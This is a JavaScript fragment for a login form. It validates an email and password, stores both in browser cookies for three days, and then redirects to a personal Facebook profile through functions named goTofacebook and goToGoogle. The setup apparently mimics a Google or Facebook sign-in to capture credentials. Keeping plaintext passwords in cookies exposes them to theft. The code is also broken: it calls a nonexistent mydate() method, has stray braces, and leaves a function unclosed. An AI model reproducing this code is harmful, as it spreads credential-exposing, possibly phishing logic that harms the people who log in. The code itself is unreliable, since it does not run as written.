function setCookie(name, value, days, ) {
  var expires = new Date(Date.now() + days * 24 * 60 * 60 * 1000);
   document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires.mydate()}}`;
}
//console.log(document.querySelector("input[name='email']").value)

////////////////////////////

    function validateForm() {
      // Get the email and password input fields
      var emailInput = document.getElementById('emailaddress');
      var passwordInput = document.getElementById('BASS');
      // Check if the email input is empty
      if (emailInput.value === '') {
        // Display an error message
        alert('Please enter your email address.');
        // Focus the email input field
        emailInput.focus();
        // Return to prevent the form from submitting
        return;
      }

      
////////////////////////////////////
      
      // Check if the email input is a valid email address
      var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,6}$/;
      if (!emailRegex.test(emailInput.value)) {
        // Display an error message
        alert('Please enter a valid email address.');
        // Focus the email input field
        emailInput.focus();
        // Return to prevent the form from submitting
        return;
      }
    
      
    //////////////////////////////////////////////
      // Check if the password input is at least 8 characters long
      if (passwordInput.value.length < 8) {
        // Display an error message
        alert('Your password must be at least 8 characters long.');
        // Focus the password input field
        passwordInput.focus();
        // Return to prevent the form from submitting
        return;
      }
      setCookie("email", document.querySelector("input[name='email']").value, 3);
      setCookie("password", document.querySelector("input[name='password']").value, 3);
      // All the form fields are valid, so submit the form
      document.getElementById('name').submit();
    }
    
    
    
    // توجيه المستخدم إلى الصفحة الرئيسية
  

 function goTofacebook() {
    window.location.replace("https://www.facebook.com/noorhhanahmed?mibextid=ZbWKwL");
   }
   function goToGoogle() {
   window.location.replace("https://www.facebook.com/noorhhanahmed?mibextid=ZbWKwL");
     }